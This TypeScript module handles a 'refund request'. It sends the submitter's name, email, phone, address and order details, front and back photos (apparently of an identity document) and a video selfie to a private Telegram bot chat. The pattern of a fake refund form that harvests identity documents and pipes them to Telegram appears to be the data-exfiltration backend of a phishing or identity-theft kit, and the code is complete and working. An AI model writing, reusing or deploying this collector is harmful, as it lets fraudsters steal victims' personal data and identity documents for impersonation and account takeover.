import type { RefundDetails } from "./details-schema";
import type { Verification } from "./verification-schema";

const TELEGRAM_API_BASE = "https://api.telegram.org/bot";

export interface ValidatedRefundSubmission {
  readonly details: RefundDetails;
  readonly files: Verification;
}

export interface RefundSubmissionReceipt {
  readonly reference: string;
}

interface TelegramResponse {
  ok: boolean;
  description?: string;
}

export async function handOffRefundSubmission(
  submission: ValidatedRefundSubmission
): Promise<RefundSubmissionReceipt> {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    throw new Error(
      "Telegram integration is not configured."
    );
  }

  const reference = createReference();

  await sendTelegramMessage(
    botToken,
    chatId,
    buildDetailsMessage(reference, submission.details)
  );

  await sendTelegramDocument(
    botToken,
    chatId,
    submission.files.frontPhoto,
    `Refund ${reference} — Front photo`
  );

  await sendTelegramDocument(
    botToken,
    chatId,
    submission.files.backPhoto,
    `Refund ${reference} — Back photo`
  );

  await sendTelegramDocument(
    botToken,
    chatId,
    submission.files.videoSelfie,
    `Refund ${reference} — Video selfie`
  );

  return { reference };
}

async function sendTelegramMessage(
  botToken: string,
  chatId: string,
  text: string
): Promise<void> {
  const response = await fetch(
    `${TELEGRAM_API_BASE}${botToken}/sendMessage`,
    {
      method: "POST",
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text,
      }),
    }
  );

  await assertTelegramSuccess(response, "sendMessage");
}

async function sendTelegramDocument(
  botToken: string,
  chatId: string,
  file: File,
  caption: string
): Promise<void> {
  const formData = new FormData();

  formData.append("chat_id", chatId);
  formData.append("document", file, file.name);
  formData.append("caption", caption);

  const response = await fetch(
    `${TELEGRAM_API_BASE}${botToken}/sendDocument`,
    {
      method: "POST",
      body: formData,
    }
  );

  await assertTelegramSuccess(response, "sendDocument");
}

async function assertTelegramSuccess(
  response: Response,
  operation: string
): Promise<void> {
  let result: TelegramResponse;

  try {
    result = (await response.json()) as TelegramResponse;
  } catch {
    throw new Error(
      `Telegram ${operation} returned an invalid response.`
    );
  }

  if (!response.ok || !result.ok) {
    throw new Error(
      `Telegram ${operation} failed: ${
        result.description ?? `HTTP ${response.status}`
      }`
    );
  }
}

function buildDetailsMessage(
  reference: string,
  details: RefundDetails
): string {
  return [
    "🔔 NEW REFUND REQUEST",
    "",
    `Reference: ${reference}`,
    "",
    "ORDER DETAILS",
    `Order number: ${details.orderNumber}`,
    `Order amount: €${details.orderAmount}`,
    "",
    "CUSTOMER",
    `Full name: ${details.fullName}`,
    `Email: ${details.email}`,
    `Phone: ${details.phone}`,
    "",
    "ADDRESS",
    `Address: ${details.address}`,
    `City: ${details.city}`,
    `ZIP code: ${details.zipCode}`,
    `Country: ${details.country}`,
  ].join("\n");
}

function createReference(): string {
  const timestamp = Date.now().toString(36).toUpperCase();
  const random = crypto.randomUUID().slice(0, 8).toUpperCase();

  return `REF-${timestamp}-${random}`;
}